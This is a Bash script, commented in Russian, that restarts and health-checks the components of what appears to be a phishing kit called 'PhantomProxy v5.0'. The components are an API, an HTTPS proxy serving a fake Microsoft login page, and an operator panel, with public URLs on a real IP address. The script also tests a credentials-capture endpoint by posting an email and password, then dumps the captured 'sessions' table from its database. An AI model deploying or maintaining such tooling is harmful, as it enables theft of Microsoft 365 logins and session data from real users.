#!/bin/bash
# PhantomProxy v5.0 - Исправление и запуск всех сервисов

cd ~/phantom-proxy

echo "=== Остановка старых процессов ==="
pkill -f 'python.*api.py' 2>/dev/null || true
pkill -f 'python.*https.py' 2>/dev/null || true
pkill -f 'python.*server.py' 2>/dev/null || true
sleep 2

echo "=== Проверка файлов ==="
ls -la api.py https.py templates/microsoft_login.html

echo "=== Запуск API ==="
nohup python3 api.py > api.log 2>&1 &
sleep 3

echo "=== Проверка API ==="
curl -s http://localhost:8080/health && echo ' ✅ API работает' || echo ' ❌ API НЕ работает'

echo "=== Запуск HTTPS Proxy ==="
cd ~/phantom-proxy
nohup python3 https.py > https.log 2>&1 &
sleep 3

echo "=== Проверка HTTPS ==="
curl -sk https://localhost:8443/microsoft | head -1 && echo ' ✅ HTTPS работает' || echo ' ❌ HTTPS НЕ работает'

echo "=== Запуск Panel ==="
cd ~/phantom-proxy/panel
nohup python3 server.py > ../panel.log 2>&1 &
sleep 3

echo "=== Проверка Panel ==="
curl -s http://localhost:3000/ | head -1 && echo ' ✅ Panel работает' || echo ' ❌ Panel НЕ работает'

echo ""
echo "=== ИТОГИ ==="
echo "API:     http://212.233.93.147:8080/health"
echo "HTTPS:   https://212.233.93.147:8443/microsoft"
echo "Panel:   http://212.233.93.147:3000"
echo ""
echo "=== Тест сохранения данных ==="
curl -X POST http://localhost:8080/api/v1/credentials \
  -H 'Content-Type: application/json' \
  -d '{"email":"test@test.com","password":"test123","service":"Microsoft 365"}'
echo ''
echo "=== Проверка БД ==="
python3 -c "import sqlite3; conn = sqlite3.connect('phantom.db'); c = conn.cursor(); c.execute('SELECT * FROM sessions'); print('Данные в БД:', c.fetchall()); conn.close()"
